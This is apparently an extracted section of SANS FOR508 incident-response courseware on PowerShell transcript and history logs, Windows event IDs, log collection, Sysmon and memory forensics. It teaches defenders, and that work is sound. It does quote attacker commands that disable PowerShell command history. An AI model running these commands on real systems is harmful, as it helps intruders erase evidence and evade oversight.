PowerShell. Script block logging would capture the script (and possible download cradle) used to execute the
Mimikatz code. Transcript logging would show the name of the script executed (or download cradle if it were
typed in the terminal), along with all the output provided by Mimikatz. Transcript logging could be the only way
to really know whether the execution of Mimikatz was successful, and what the attackers were able to collect.
Since transcript logging only collects the inputs and output of PowerShell terminal sessions, the log sizes are
routinely much smaller than the corresponding event logs, making large-scale collection feasible.
The output folder for transcript logs is determined when they are enabled and can be set by Group Policy. If no
output directory is specified, logs will default to the Documents folder under each user profile. Storing
important log data under a user profile is not recommended as the logs are in text format and trivial for an
attacker to delete or modify. Thus, a good best practice is to store them in a folder locked down with write-only
permissions (except perhaps for the security team account). Ideally this folder would be on a network share and
as Microsoft states, “limit access to that directory to prevent users from viewing the transcripts of other users or
computers.” [1]

© 2023 SANS Institute

.

171

.

[1] About Group Policy Settings - PowerShell | Microsoft Docs: https://for508.com/05zvl

172

© 2023 SANS Institute

.

PowerShell Transcript Logs (2)
Start Time
YYYYMMDDHHMMSS
(local system time)

Metadata
(including
username)

Command
Output
Displayed
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

173

.

Here we see a PowerShell transcript log example. The domain account spsql ran the command Get-Item for a
registry key in the System hive. Along with the date and time of execution, the logs also record what was output
to the terminal. In this case, we see the contents of the registry key queried. Times stored within PowerShell
transcript logs are in local system time and need conversion to UTC to match native event log times. Times are
stored in the format Year-Month-Day-Hour-Minute-Second (YYYYMMDDHHMMSS).
Transcript logs can be excellent places to learn specific attacker tradecraft, discover attacker tool names and
directories, and even “watch” as attackers make mistakes and run into difficulties with their toolsets.

© 2023 SANS Institute

.

173

.
174

© 2023 SANS Institute

.

PSReadline ConsoleHost_history.txt
%UserProfile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline

• ConsoleHost_history.txt
• Records last 4,096 commands typed in PS console (not ISE)
• Enabled by default in Win10+/PowerShell v5

• Attackers can disable (or remove PsReadLine module)
• Set-PSReadLineOption –HistorySaveStyle SaveNothing
• Remove-Module –Name PsReadline

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

175

PowerShell version 5 finally introduced good event logging, and they didn’t stop there. PSReadline is now a
default module designed to log the last 4,096 commands typed in the PowerShell console. For those aware of
Linux artifacts, it is the equivalent of Bash History, but now in Windows!

.

The commands are stored locally in each user’s profile, using a file named ConsoleHost_history.txt.
The file format is a flat text file. Even commands typed in an Administrator PowerShell console are recorded in
the currently logged-on user’s history file. Unfortunately, this file is not protected by Windows, so
knowledgeable attackers could easily remove or edit it. It is also possible to temporarily disable command line
recording using one of the following two options. Luckily, the options themselves are recorded in the file, and
they are not permanent.
•
•

Set-PSReadlineOption –HistorySaveStyle SaveNothing
Remove-Module –Name PsReadline

While similar to Transcript logging, only commands typed (not outputs) are recorded, and no additional
metadata like timestamps are available. These logs are also only recorded during interactive sessions explicitly
using the PowerShell console. Their one advantage over transcript logging is that they are available by default
for all users.
Interestingly, PSReadline started as a GitHub project as a PowerShell add-on before it was implemented by
default into PowerShell version 5.[1]
[1] PSReadLine: A bash inspired readline implementation for PowerShell: http://for508.com/1uige

© 2023 SANS Institute

.

175

Event Log Overview

Event Log Fundamentals
Analysis Scenarios
Event Log Resources
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

This page intentionally left blank.

176

© 2023 SANS Institute

.

176

Event Log Summary
Logons

Security

Account Logon

Security

4624, 4625, 4634, 4647,
4648, 4672, 4720, 4726
4768, 4769, 4771, 4776

Security | RDPClient | RDPCoreTS
| RemoteConnectionManager

4624, 4625, 4778 , 4779 |
1024, 1102 | 98, 131 | 1149

Network Shares

Security

5140-5145

Scheduled Tasks

Security | Task Scheduler

4698 | 106, 140-141, 200-201

RDP

Installation
Services
Log Clearing
Malware Execution
Anti-Malware Log
Command Lines
WMI

Application
System | Security
Security | System
Security | System | Application
Windows-Defender/Operational

1033, 1034, 11707, 11708,
11724
7034-7036, 7040, 7045 |
4697
1102 | 104
4688 | 1001 | 1000–1002
1116-1119

Security | PowerShell/Operational 4688 | 4103–4104
WMI-Activity/Operational

5857-5861

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

177

.

A majority of the events discussed in this section are represented in this table. Keep in mind that this is just a
taste, and there are many other events you will encounter and identify as useful to your investigations. The next
section covers some excellent resources to help you in your journey.

© 2023 SANS Institute

.

177

Event Log Collection

Live System Collection
• Exporting from Event Viewer (.evt, .evtx, .csv, .xml, .txt)
• PsLogList (Sysinternals)
• Triage Collection via F-Response / KAPE / Velociraptor
• PowerShell

Log Forwarding
• Windows Event Forwarding (WEF)
• Winlogbeat
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

To perform event log analysis, you need to collect logs. If you are lucky, the applicable logs will have already
been forwarded to a collection server waiting for analysis. If not, you should prepare to collect logs from
multiple sources.

.

Live System Collection
You have many options for exporting logs out of both live and offline systems. When working with a live
system, it is important to keep in mind that event logs are always in use and hence locked by the operating
system. This presents a little bit of a challenge. An easy option for live export is using the Event Viewer itself.
Right-clicking the event log of interest will give you the option to “Save log”. Logs can be saved in a variety of
formats including native (.evt or .evtx), .csv, .xml, and .txt. The free PsLogList tool from Sysinternals is a
command line collection tool with many features. It can dump live logs to a text or .csv file, read and output
exported event logs in their native .evt/.evtx format, pre-filter output, and even dump event logs from remote
systems.
Scripting or agent-based solutions can collect logs at scale. PowerShell is an easy choice as it includes native
access to event logs. In its simplest form the command Get-WinEvent –LogName Security will
extract individual events. The open-source Kansa project uses this capability to scale collection. Entire event
logs can be collected using commands like the following:
(Get-WmiObject -Class Win32_NTEventlogFile | Where-Object LogfileName -EQ
'System').BackupEventlog(‘G:\System.evtx')
There are also many triage frameworks that facilitate log collection. Velociraptor is an open-source endpoint
tool that includes event log collection capabilities. F-Response is a simple commercial tool that provides raw
access to disk and can be scripted against. Combined with a free triage collection tool like KAPE it provides an
easy way to collect logs (and much more).
Log Forwarding
There are few excuses left for those who are not centralizing their log collection. Excellent free tools exist to
facilitate log forwarding, disk space is cheap, and the odds of being involved in an incident requiring access to
multiple logs is high. Microsoft has been supporting Windows Event Forwarding (WEF) for years and provides
178

© 2023 SANS Institute

.

178

excellent guidance including examples from their installation of over 700,000 endpoints.[1] WEF is agent-free
and uses native components already baked into all modern Windows workstation and server products. It can be
set up to either push logs or have them pulled at regular intervals. XPath filters can be used for precise prefiltering, only sending events of a specific type and/or ignoring known noise events.
Winlogbeat is a very popular free option to send logs to Elasticsearch databases, Logstash, or tools like
Graylog.[2] It installs as a service, reads logs via the Windows API, filters logs with user-defined criteria, and
then sends event entries to the remote database. Like WEF, Winlogbeat has been tested in large environments
and has useful features like event buffering during database outages.

.

[1] Windows Event Forwarding Survival Guide: https://for508.com/g4v2h
[2] Winlogbeat Analyze Windows Event Logs: https://for508.com/gy83o

© 2023 SANS Institute

.

179

Get-WinEvent and PowerShell

• PowerShell can be used to collect and filter logs

• Get-WinEvent -ComputerName for remote collection
• Get-WinEvent -Logname for local events
• Get-WinEvent -Path for archived log files

Get-WinEvent -FilterHashtable
@{Logname=“Security";id=4624} | Where
{$_.Message -match “spsql"}
Get-WinEvent -FilterHashtable
@{Path="C:\Path-To-Exported\Security*.evtx“
;id=5140} | Where {$_.Message -match
"\\Admin\$"}
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

PowerShell gives native access to event logs and can be leveraged to collect and filter logs from a single system
or hundreds. The Get-WinEvent cmdlet was released with Vista\Windows 2008R2 and should be used with
the modern EVTX format. The Get-EventLog cmdlet was previously used for the older, “classic” logs.

.

A significant upgrade included with Get-WinEvent is the ability to perform client-side filtering, which is
particularly useful when using the cmdlet across many remote systems (ideally via PowerShell remoting). The
examples seen on this slide show some of that filtering capability, using the -FilterHashTable option. In
the first example, the local Security log is filtered for 4624 (Successful Logon) events that have the keyword
“spsql” in the text message field. The second example is being run on a collection of exported logs (wildcards
can be used to search groups of logs). Network share objects are being filtered (Event ID 5140), specifically
looking for the unusual Admin$ access.
Output can be in table view, csv (using -ConvertTo-Csv), HTML (using -ConvertTo-Html), or one of
the many output and format options in PowerShell.
Getting the PowerShell syntax and filtering options together can be a challenge, but the ability to collect and
pre-filter logs across an enterprise more than makes up for the initial work writing those scripts. There are many
resources available to help. As an example, many regular expressions have been shared with the community to
help filter logs at scale.[1] A great article to start with is the post, “PowerShell Script To Search Log Files with
Regular Expressions”, on the SANS Cyber Defense blog.[2] When you are ready to optimize your PowerShell
collection at scale, note there are several different ways to filter results in PowerShell.[3]
[1] Detecting Security Incidents Using Windows Workstation Event Logs: http://for508.com/gp5cz
[2] PowerShell Script To Search Log Files With Regular Expressions: http://for508.com/8azrh
[3] PowerShell Performance - Filtering Collections: https://for508.com/5r84a

180

© 2023 SANS Institute

.

180

Scaling Event Log Analysis

1. Collect event logs

2. Build interesting triggers

• PowerShell
• Event forwarding
• SIEM, Splunk, GrayLog, etc.

• PowerShell using “IEX”
• 4624 Type 10 to workstations
• Service acct interactive logons

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

181

.

This section has provided a good overview of the most important Windows events for hunting and incident
response investigations. While deep dive log analysis is relevant for a handful of systems, different tools are
necessary when hunting across large numbers of machines. Every organization will greatly increase their
defensive posture by collecting and centralizing logs. Microsoft provides a free capability to do so with
Windows Event Forwarding (WEF).[1] Winlogbeat is an open-source forwarding solution designed to work with
Elasticsearch.[2] Many commercial solutions also exist, often in support of a specific SIEM solution (Splunk’s
Universal Forwarder is one example).[3] While an entire day could be spent on SIEM best practices, one of the
most important things you can do is filter your logs before forwarding! Only a small percentage of event logging
tends to be useful, and instead of slowing down your solution with a mound of useless data, consider first
focusing on the most important events and then expanding from there. This section provided an excellent
starting point for identifying critical events to log.
Once you have your logs centralized, the next step is developing a set of searches to hunt for evil. This set is
only limited by your imagination and might comprise hundreds of different use cases you have found to identify
anomalous activity. Nearly everything covered in this section could be used to find evil at scale. As an example,
the image on this slide shows a GrayLog instance being used to search for unusual activity. Notice the search is
“event_id:5140 AND C$”. As we now know, this will return any system where the C$ admin share was
mounted. We could further filter by suspicious user accounts, dates, system type (assuming a consistent naming
scheme), etc. Event logs can easily be used at scale during investigations, and throughout this entire course we
want you to be thinking about how you might use a specific detection technique to find evil across the
enterprise.
[1] Use Windows Event Forwarding to help with intrusion detection: http://for508.com/mk4so
[2] Winlogbeat: Analyze Windows Event Logs: http://for508.com/fploh
[3] Splunk Universal Forwarder: http://for508.com/9ads5

© 2023 SANS Institute

.

181

.
182

© 2023 SANS Institute

.

System Monitor (Sysmon) Logging (1)

Free logging extension from Microsoft

• Built for DFIR investigations
• Easy configuration + pre-filtering
• Designed to scale and integrate with SIEMs
• Network activity
• Process execution
• Command lines
• File hashes
• File creation
• Creation time change
• Registry changes

• DLL and driver loading
• Remote thread creation
(injection)
• Named pipe creation
• Alternate data streams
• WMI Event Consumers
• Raw disk access

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

183

.

If you could only have one set of logs, sadly, the best available log is the one that does not ship with Windows.
Mark Russinovich from Microsoft Sysinternals created Sysmon to fill in the visibility gaps in event logging.[1]
He specifically designed it for DFIR investigations within the Microsoft corporate network. Hence, it reads like
a wish list of items that forensic examiners would love to have represented in the event logs. Sysmon logging
can easily show that a new file was created via an encoded PowerShell command, which resulted in a Registry
key update and a new alternate data stream. It can then provide the hash of the file (including SHA1, MD5,
SHA2, and even IMPHash) and track any network connections created by the suspicious running process.
Installation and configuration of the tool is easy, and the result is a new event log named MicrosoftWindows-Sysmon/Operational. Logs are descriptive and not nearly as obtuse as much of the Windows
log reporting. Perhaps most importantly, filtering and allowlisting can be pre-configured to eliminate noise and
reduce the size of logs. This makes collection of items like process execution far more feasible than traditional
4688 events in the Security log.
Think of Sysmon as a lightweight endpoint detection tool available for free. It can help detect network
reconnaissance, lateral movement, credential stealing and use, and wide variety of file system interactions.
Perhaps its worst feature is that it leverages the Windows event log format. This can make analysis and filtering
challenging (as we have already seen in this section). However, this limitation can be mitigated by importing
logs into a SIEM-like aggregator like Splunk. In fact, there are many great case studies available online from
security teams who are leveraging Sysmon and Splunk with great success.
[1] Tracking hackers on your network with Sysmon: (PDF): http://for508.com/3a12y

© 2023 SANS Institute

.

183

System Monitor (Sysmon) Logging (2)

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

Windows event logging was originally designed to support system administration, and useful security logging
has historically been weak. This has improved with modern versions of the operating system, but System
Monitor (Sysmon) logging from Microsoft Sysinternals is a giant leap forward. Sysmon provides the real-world
security logging that should be native to Windows.

.

We see two examples of Sysmon logging on this slide. Event ID 1 on the left demonstrates command line
auditing. Specifically, we see PowerShell being used to compile a .MOF file named
C:\Windows\Temp\config.mof. Notice we also get the hash of the file that executed, something that is currently
impossible via standard Windows event logging. One of the advantages of using Sysmon for command line
auditing is the Sysmon configuration file allows pre-filtering of output, greatly reducing the number of events as
compared to the equivalent command line auditing via Process Tracking EID 4688 events.
The Sysmon Event ID 20 event on the right of the slide records the result of the previous .MOF compilation.
Now we see that a new WMI command line event consumer has been added to the system, and the command
line set to execute is C:\Windows\Temp\kb23095898.exe. Assuming a good configuration file, Sysmon events
are extremely high fidelity, conserving analysts’ time and allowing rapid detection of anomalous activity.

184

© 2023 SANS Institute

.

184

.
© 2023 SANS Institute

.

185

Event Log Analysis Resources

Windows 10 Security Auditing
and Monitoring Reference

Ultimate Windows Security

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

Unless you are a savant, it is nearly impossible for anyone to memorize all the various Event IDs and their
related error codes. Luckily, you don’t have to. There are a wealth of great online options for looking up all
things event log related. Some of our favorites are listed here.

.

Ultimate Windows Security (recently renamed to Ultimate IT Security) has done
a good job of creating THE resource for all things related to the Security event log. [1] It has a great free database
that is regularly updated and crowdsourced. This is often my first stop when looking up an unfamiliar event.
Going to the source is not a bad starting place, and the Microsoft website for security event logs does a good job
of documenting a vast number of the possible Event IDs for many different Microsoft operating systems and
applications. The real strength of this resource is in the codes for the Application and System logs that are
poorly documented elsewhere. Prepare yourself for many of the same useless event descriptions that system
administrators have agonized over for the last decade. More recently, Microsoft has released a very detailed
auditing guide, named the “Windows 10 Security Auditing and Monitoring Reference”. [2] It should be part of
everyone’s reference library!
[1] Ultimate Windows Security Log Encyclopedia: https://for508.com/mzk9p
[2] Windows 10 Security Auditing and Monitoring Reference: https://for508.com/zqliv

186

© 2023 SANS Institute

.

186

Lab 2.4
WMI, PowerShell, and Microsoft Defender
Log Analysis
Average Time: 35 Minutes

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

187

.

This page intentionally left blank.

© 2023 SANS Institute

.

187

FOR508 | Advanced Incident Response,Threat Hunting, and Digital Forensics 188

.

This page intentionally left blank.

188

© 2023 SANS Institute

.

COURSE RESOURCES AND CONTACT INFORMATION
Here is my lens. You know my methods. –Sherlock Holmes
AUTHOR CONTACT
rlee@sans.org
http://twitter.com/robtlee

SANS INSTITUTE
11200 Rockville Pike, Suite 200
N. Bethesda, MD 20852
301.654.SANS(7267)

ctilbury@sans.org
http://twitter.com/chadtilbury
mpilkington@sans.org
https://twitter.com/mikepilkington

SANS EMAIL
DFIR RESOURCES
digital-forensics.sans.org
Twitter: @sansforensics

GENERAL INQUIRIES: info@sans.org
REGISTRATION: registration@sans.org
TUITION: tuition@sans.org
PRESS/PR: press@sans.org

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

189

.

This page intentionally left blank.

© 2023 SANS Institute

.

189

FOR508 | ADVANCED INCIDENT RESPONSE, THREAT HUNTING, & DIGITAL FORENSICS
GIAC Certified Forensic Analyst (GCFA)

508.3

.

Memory Forensics in Incident
Response and Threat Hunting

THE MOST TRUSTED SOURCE FOR INFORMATION SECURITY TRAINING, CERTIFICATION, AND RESEARCH

.

|

sans.org

© 2023 SANS Institute All rights reserved to SANS Institute.
PLEASE READ THE TERMS AND CONDITIONS OF THIS COURSEWARE LICENSE AGREEMENT ("CLA") CAREFULLY
BEFORE USING ANY OF THE COURSEWARE (DEFINED BELOW) ASSOCIATED WITH THE SANS INSTITUTE COURSE.
THIS IS A LEGAL AND ENFORCEABLE CONTRACT BETWEEN YOU (THE “USER”) AND THE ESCAL INSTITUTE OF
ADVANCED TECHNOLOGIES, INC. /DBA SANS INSTITUTE (“SANS INSTITUTE”) FOR THE COURSEWARE. BY
ACCESSING THE COURSEWARE, USER AGREES TO BE BOUND BY THE TERMS OF THIS CLA.
With this CLA, SANS Institute hereby grants User a personal, non-exclusive license to use the Courseware subject to the
terms of this agreement. Courseware means all printed materials, including course books and lab workbooks, slides or notes,
as well as any digital or other media, audio and video recordings, virtual machines, software, technology, or data sets
distributed by SANS Institute to User for use in the SANS Institute course associated with the Courseware. User agrees that
the CLA is the complete and exclusive statement of agreement between SANS Institute and you and that this CLA supersedes
any oral or written proposal, agreement or other communication relating to the subject matter of this CLA.
BY ACCESSING THE COURSEWARE, USER AGREES TO BE BOUND BY THE TERMS OF THIS CLA. USER FURTHER
AGREES THAT ANY BREACH OF THE TERMS OF THIS CLA MAY CAUSE IRREPARABLE HARM AND SIGNIFICANT
INJURY TO SANS INSTITUTE, AND THAT SANS INSTITUTE MAY ENFORCE THESE PROVISIONS BY INJUNCTION
(WITHOUT THE NECESSITY OF POSTING BOND) SPECIFIC PERFORMANCE, OR OTHER EQUITABLE RELIEF.
If User does not agree to the terms of this CLA, User should not access the Courseware. User may return the Courseware to
SANS Institute for a refund, if applicable.
User may not copy, reproduce, re-publish, distribute, display, modify or create derivative works based upon all or any portion of
the Courseware, in any medium whether printed, electronic or otherwise, for any purpose, without the express prior written
consent of SANS Institute. Additionally, User may not sell, rent, lease, trade, or otherwise transfer the Courseware in any way,
shape, or form to any person or entity without the express written consent of SANS Institute.
If any provision of this CLA is declared unenforc.eable in any jurisdiction, then such provision shall be deemed to be severable
from this CLA and shall not affect the remainder thereof. An amendment or addendum to this CLA may accompany this
Courseware.
SANS Institute may suspend and/or terminate User’s access to and require immediate return of any Courseware in connection
with any (i) material breaches or material violation of this CLA or general terms and conditions of use agreed to by User; (ii)
technical or security issues or problems caused by User that materially impact the business operations of SANS Institute or
other SANS Institute customers, or (iii) requests by law enforcement or government agencies.

.

SANS Institute acknowledges that any and all software and/or tools, graphics, images, tables, charts or graphs presented in
this Courseware are the sole property of their respective trademark/registered/copyright owners, including:
AirDrop, AirPort, AirPort Time Capsule, Apple, Apple Remote Desktop, Apple TV, App Nap, Back to My Mac, Boot Camp,
Cocoa, FaceTime, FileVault, Finder, FireWire, FireWire logo, iCal, iChat, iLife, iMac, iMessage, iPad, iPad Air, iPad Mini,
iPhone, iPhoto, iPod, iPod classic, iPod shuffle, iPod nano, iPod touch, iTunes, iTunes logo, iWork, Keychain, Keynote, Mac,
Mac Logo, MacBook, MacBook Air, MacBook Pro, Macintosh, Mac OS, Mac Pro, Numbers, OS X, Pages, Passbook, Retina,
Safari, Siri, Spaces, Spotlight, There’s an app for that, Time Capsule, Time Machine, Touch ID, Xcode, Xserve, App Store, and
iCloud are registered trademarks of Apple Inc.
PMP® and PMBOK® are registered trademarks of PMI.
SOF-ELK® is a registered trademark of Lewes Technology Consulting, LLC. Used with permission.
SIFT® is a registered trademark of Harbingers, LLC. Used with permission.
REMnux® is a registered trademark of Zeltser Security Crop. Used with permission.
VMware Workstation Pro®, VMWare Workstation Player®, VMWare Fusion®, and VMware Fusion Pro® are registered
trademarks of VMware, Inc. Used with permission.
Governing Law: This Agreement shall be governed by the laws of the State of Maryland, USA.
Courseware licensed to User under this Agreement may be subject to export laws and regulations of the United States of
America and other jurisdictions. User warrants he or she is not listed (i) on any sanction programs list maintained by the U.S.
Office of Foreign Assets Control within the U.S. Treasury Department (“OFAC”), or (ii) denied party list maintained by the U.S.
Bureau of Industry and Security within the U.S. Department of Commerce (“BIS”). User agrees to not allow access to any
Courseware to any person or entity in a U.S. embargoed country or in violation of a U.S. export control law or regulations.
User agrees to cooperate with SANS Institute as necessary for SANS Institute to comply with export requirements and
recordkeeping required by OFAC, BIS or other governmental agency.
All reference links are operational in the browser-based delivery of the electronic workbook.
FOR508_3_I01_01

.

FOR508.3

Advanced Incident Response,Threat Hunting, and Digital Forensics

Memory Forensics in
Incident Response
and Threat Hunting
© 2023 SANS Institute | All Rights Reserved | Version I01_01

Welcome to Section 3.

Rob Lee
rlee@sans.org
https://twitter.com/robtlee
https://twitter.com/sansforensics

.

Author Team:

Chad Tilbury
ctilbury@sans.org
https://twitter.com/chadtilbury
Mike Pilkington
mpilkington@sans.org
https://twitter.com/mikepilkington

© 2023 SANS Institute

.

1

FOR508 | Advanced Incident Response,Threat Hunting, and Digital Forensics

.

This page intentionally left blank.

2

© 2023 SANS Institute

.

FOR508 Intrusion Methodology Roadmap
1

2

3

Threat Hunting & Assessment
Collection and analysis at scale across the
enterprise. Begin identification and scoping.

Triage Collection & Analysis
Targeted data acquisition to validate findings
and develop threat intelligence.

Deep-Dive Forensics
In-depth analysis on systems and malware to
further identify tradecraft and build IOCs.

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

3

Your journey through FOR508 has been designed to follow a standard workflow for performing threat hunting,
compromise assessments, and incident response activities. The roadmap we will use in this class is as follows:

.

Threat Hunting & Assessment
We will start our process by looking at the network using tools that can scale collection and analysis, focusing
on occurrence stacking and outlier analysis. Most attendees have thousands of endpoints necessitating broad
scoping techniques at the start of an investigation.
Triage Collection & Analysis
As systems of interest are identified, we will perform targeted triage collection to acquire a deeper
understanding of attacker activity. Triage data can include traditional forensic artifacts like application
execution data, file system information, and in-memory artifacts such as process trees.
Deep-Dive Forensics
Finally, we will reserve our limited analyst time for performing deep-dive forensics on only a handful of
systems having the best chance to help us understand attacker tools and tradecraft and craft better indicators to
assist with scoping additional compromised systems.

© 2023 SANS Institute

.

3

Memory Forensics in Incident Response and Threat Hunting Agenda

Why Memory Forensics?
Acquiring Memory
Introduction to Memory Analysis
Code Injection, Rootkits, and Extraction
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

This page intentionally left blank.

4

© 2023 SANS Institute

.

4

Why Memory Forensics?

Everything in the OS traverses RAM:
• Processes and threads
• Malware (including rootkit technologies)
• Network sockets, URLs, IP addresses
• Open files
• User-generated content
• Passwords, caches, clipboards
• Encryption keys
• Hardware and software configuration
• Windows registry keys and event logs
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

5

RAM is the bridge among the CPU, operating system, and getting things done. Nearly everything of interest that
has ever happened on a modern computer has traversed RAM. From files to network connections to registry
hives to running malware, a wealth of data is available for analysis.

.

Historically, memory analysis was largely limited to performing string and byte searches through seemingly
random data. Now, memory structures are better understood, and new tools exist that allow for a more granular
approach to examining the contents of memory. Just what is sitting in memory? You have all the processes,
files, directories, and drivers in addition to a hoard of memory-mapped residue. You can use this information to
piece together history and commands that a previous individual might have typed on the system. You might
discover old emails or the malicious websites that the user surfed to. You might find residue from old, exited
applications. And if you are lucky, you might have clear-text passwords still sitting in memory.

© 2023 SANS Institute

.

5

Memory Analysis Advantages

• Best place to identify malicious software activity
• Study running system configuration
• Identify inconsistencies (contradictions) in system
• Bypass packers, binary obfuscators, rootkits (including kernel
mode), and other hiding tools

• Analyze and track recent activity on the system
• Identify all recent activity in context
• Profile user or attacker activities

• Collect evidence that cannot be found anywhere else
• Memory-only malware
• Chat threads
• Internet activities
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

Currently, there is no better place to discover malware than in RAM. There is literally no place left for it to hide.
The classic malware dilemma manifests perfectly in memory: malware wants to hide, but it also has to execute
to be effective. Malware might be successful at either hiding or executing, but it is nearly impossible to do both!

.

With the size of system memory steadily increasing, it is becoming less volatile and more like a secondary file
system. We will learn how to identify running processes and threads along with all of their associated DLLs,
files, and registry key handles. Seeing how something behaves in memory gives far more information than
trying to piece the hundreds of different parts together from disk.
There are a number of key artifacts that might exist only in memory. Advanced malware exists that attempts to
never write to disk. The majority of chat applications do not log communications to disk by default. And as
users become savvier about privacy, memory might be our best bet for finding artifacts from things like "InPrivate" or "Incognito" browsing sessions. Even the Windows registry takes on a life of its own within
memory—there are volatile registry keys that can be updated and survive only in memory.

6

© 2023 SANS Institute

.

6

EDR and Memory Forensics

• In-memory detections provide advanced capabilities
Process
Information

Command line
artifacts

Network activity

Process handles
and execution
tracing

Windows API
Usage

DLL injection and hooking (rootkit)
detection

Thread creation
and memory
allocation

• Easy detection of many PS, WMI and fileless attacks
• Forensics and memory analysis skills enable
effective use of EDR by analysts and hunters
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

7

.

Advances in network and endpoint forensics coupled with lowered costs of storage and computational power
can now provide real-time and historical visibility unheard of even a few years ago. Actions can be taken based
on that data either in an automated or manual fashion. A new wave of Endpoint Detection and Response (EDR)
solutions use pattern analysis, heuristics detection, and machine learning on the back-end to enable automated
blocking of suspicious activity. But EDR is distinguished by its ability to be used for both detection and incident
response. Interface into this data store can be a tremendous force multiplier for security teams, giving the ability
to hunt for evil activity at scale and perform historical searches for known bad activity to assist with scoping and
remediation of intrusions. Once an indicator of attack is discovered, the ability to go back in time and see where
else that activity was recorded significantly reduces identification and containment times and greatly increases
the cost to the adversary as their tradecraft is discovered.
Modern attacks have moved to memory to evade disk-based security solutions, including the advent of “fileless”
malware. Hence, in-memory detections are critical to detect new attacks using PowerShell, WMI, and advanced
forms of code injection and obfuscation. EDR tools gain much of their advanced capabilities via memory
analysis and event tracing. Since these tools often have kernel level access to the endpoint, a wealth of memorybased analysis can be conducted. Some common capabilities include:
•
•
•
•
•
•

Process information
Windows API usage
Archival of command line data for each process
Tracking of new process handles and execution tracing
Analyzing suspicious thread creation and memory allocation
Identification of common DLL injection and rootkit hooking techniques (can be limited in tools using system
API calls to audit memory components instead of true memory introspection)
• Recording of host-based network activity, including local DNS cache, sockets, ARP, etc.
It is important to differentiate EDR from traditional enterprise forensic tools. It would be impossible to capture
every event on every system historically. A single system generates millions of events per day. As an example,
Process Monitor from Sysinternals can identify 5000+ events per second, while EDR solutions might collect
around 30 events per minute to limit host impact. These tools are choosing a small set of data points to collect,
© 2023 SANS Institute

.

7

which the user typically cannot specify. Contrast this to traditional forensic tools which are designed to capture
complete disk and memory images of systems. The benefits of EDR are scale, and they can be supplemented
with deep dive forensics when necessary to fully describe attacker activity or identify root cause. For the same
reason, EDR is also a supplement, not a replacement for network monitoring and SIEM log collection. EDR is
very good at identifying real-time actions and some historical activity, but disk and memory forensics can often
tell a deeper, more meaningful story, including about activity occurring before EDR was installed!

.

In summary, no matter how much artificial intelligence and machine learning are hyped, human analysts are
going to be required to effectively use these tools for the foreseeable future. Analysts need to have knowledge
of attacker tactics, techniques, and procedures and understand how to use disparate data sources to confirm
malicious activity. Strong forensics and memory analysis skills are necessary to take full advantage of these
data sources and are very complementary to effective use of EDR by analysts and hunters. This section and the
entire FOR508 course has been written with these goals in mind.

8

© 2023 SANS Institute

.

FOR508 Concepts Accelerate EDR Investigations

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

01

.ir

9

de

This slide shows a real-world example of suspicious activity identified by a popular EDR tool. As seen at the
bottom of the slide, the ultimate result of the activity was a series of rar.exe commands collecting documents
from multiple different user folders.

hi

Traditional forensics would undoubtedly tell us that rar.exe was run on this system. But would that be enough
information to make a determination of whether an attack is in progress? Command-line capture, as we see
here, certainly goes much further in helping the analyst understand that this is unusual activity. And finally, the
process tree at the top of the slide gives even further information the analyst can use to make a determination.
The process tree shows parent-child process relationships to assist with identification of anomalies. In this case,
rar.exe was spawned by PowerShell, which is interesting, but not necessarily indicative of evil. However,
PowerShell is spawned by cmd.exe which is spawned by a process named wrsa.exe which apparently was
running as a service (child of services.exe). This is not the normal way you would expect PowerShell to be
executed, thus providing more weight to the opinion that this is malicious activity. Process tree analysis is a
critical part of memory forensics and the more experience the analyst has with that discipline, the more effective
they can be at using this EDR tool.
While traditional forensics could have likely pieced much of this together, it would have taken a significant
amount of time to accomplish what is immediately provided by this EDR tool. By bringing in multiple data
sources into one view, EDR allows faster identification of malicious activity. However, foundational knowledge
is necessary to be able to effectively use these tools and make judgement calls on normal vs. abnormal. It is this
foundational knowledge we hope to bestow in this course.

© 2023 SANS Institute

.

9

Memory Forensics in Incident Response and Threat Hunting Agenda

Why Memory Forensics?
Acquiring Memory
Introduction to Memory Analysis
Code Injection, Rootkits, and Extraction

hi

de

This page intentionally left blank.

01

.ir

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

10

© 2023 SANS Institute

.

10

Windows Memory Acquisition
Windows

Windows Server
WinPMEM
• https://github.com/Velocidex/c-aff4/releases

MagnetForensics Ram Capture

LIVE System

• magnetforensics.com/free-tool-magnet-ram-capture

Belkasoft Live RAM Capturer

• forensic.belkasoft.com/en/ram-capturer

F-Response
• www.f-response.com

Hibernation Files
• Contains a compressed RAM Image
• %SystemDrive%\hiberfil.sys

DEAD System

Page and Swap Files
• %SystemDrive%\pagefile.sys
• %SystemDrive%\swapfile.sys (Win8+\2012+)
Kernel-Mode Dump Files
• %SystemRoot%\MEMORY.DMP

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

11

.

There are a number of different memory acquisition applications available, and they all operate similarly. Prior to
Windows 2003 SP1, a handle named \Device\PhysicalMemory could be used to address and copy memory. Due
to the security concerns of allowing access to memory from user-mode, this handle was deprecated, and a driver
must now be used to access memory through the Windows kernel. The acquisition tool loads a system driver to
gain raw access to memory and then dumps the entire contents of memory into a raw file. There are some things
to be aware of with this approach. For those of you with malware hunting experience, you might notice that using
a loaded driver for accessing raw memory is quite similar to the steps some malware takes. Hence, you might
occasionally encounter issues with host protection applications like antivirus and host intrusion prevention
software (HIPS). In 64-bit Windows operating systems, all loaded device drivers must be digitally signed. The
